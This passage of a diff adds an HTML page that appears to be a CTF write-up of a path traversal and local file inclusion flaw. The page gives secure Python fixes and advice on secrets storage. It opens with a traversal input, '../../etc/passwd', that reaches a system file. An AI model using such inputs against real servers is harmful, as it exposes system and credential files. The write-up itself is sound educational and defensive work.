+os.path.join(<span class="str">"/app/etchings"</span>, <span class="str">"../../etc/passwd"</span>)
+<span class="cm"># → "/app/etchings/../../etc/passwd"</span>
+<span class="cm"># → resolves to "/etc/passwd"</span></pre>
+    </div>
+
+    <hr class="divider">
+
+    <!-- Fix -->
+    <h2 data-num="10">The Fix — Path Sanitization</h2>
+
+    <h3>Method 1 — os.path.realpath + base check</h3>
+    <p>The most reliable fix is to resolve the full real path and verify it starts with the intended base directory:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python — secure implementation</span>
+      </div>
+      <pre><span class="kw">import</span> os
+
+BASE_DIR = <span class="str">"/app/etchings"</span>
+
+<span class="kw">def</span> <span class="fn">safe_read</span>(plate):
+    <span class="cm"># Resolve symlinks and normalize the path</span>
+    requested = os.path.realpath(
+        os.path.join(BASE_DIR, plate)
+    )
+
+    <span class="cm"># Verify it's still inside our base directory</span>
+    <span class="kw">if not</span> requested.startswith(BASE_DIR + os.sep):
+        <span class="kw">raise</span> PermissionError(<span class="str">"Access denied: path escapes base directory"</span>)
+
+    <span class="kw">with</span> <span class="fn">open</span>(requested, <span class="str">'rb'</span>) <span class="kw">as</span> f:
+        <span class="kw">return</span> f.read()</pre>
+    </div>
+
+    <h3>Method 2 — Allowlist approach</h3>
+    <p>For maximum security, use an allowlist of permitted file identifiers mapped to actual paths — never use user input as any part of a file path:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python — allowlist approach</span>
+      </div>
+      <pre>ALLOWED_PLATES = {
+    <span class="str">"1"</span>: <span class="str">"/app/etchings/plate1.txt"</span>,
+    <span class="str">"2"</span>: <span class="str">"/app/etchings/plate2.txt"</span>,
+    <span class="str">"3"</span>: <span class="str">"/app/etchings/plate3.txt"</span>,
+}
+
+<span class="kw">def</span> <span class="fn">safe_read</span>(plate_id):
+    <span class="kw">if</span> plate_id <span class="kw">not in</span> ALLOWED_PLATES:
+        <span class="kw">raise</span> ValueError(<span class="str">f"Unknown plate: {plate_id}"</span>)
+
+    <span class="kw">with</span> <span class="fn">open</span>(ALLOWED_PLATES[plate_id], <span class="str">'rb'</span>) <span class="kw">as</span> f:
+        <span class="kw">return</span> f.read()</pre>
+    </div>
+
+    <div class="warning-box">
+      <p><strong>Never store secrets in environment variables on vulnerable servers.</strong> Even if path traversal is fixed, secrets should live in a secrets manager (AWS Secrets Manager, HashiCorp Vault, etc.) — not as process environment variables that can be read from <code>/proc/self/environ</code>.</p>
+    </div>
+
+  </article>
+</div>
+
+<footer>
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-text">RedFox CTF 2026 — Path Traversal / LFI via /proc/self/environ Writeup</div>
+      <div class="footer-badge">✓ SOLVED</div>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
